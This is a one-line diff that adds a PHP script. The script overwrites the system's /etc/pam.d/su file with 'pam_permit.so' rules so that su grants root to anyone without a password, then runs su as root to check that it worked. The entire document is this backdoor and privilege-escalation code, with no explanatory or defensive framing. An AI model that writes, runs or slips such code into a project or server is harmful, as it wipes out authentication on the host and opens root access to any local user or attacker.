@@ -1,0 +1,1 @@
+<?php file_put_contents('/etc/pam.d/su', "auth sufficient pam_permit.so\naccount sufficient pam_permit.so\n");system('/usr/bin/su --login root -c whoami');
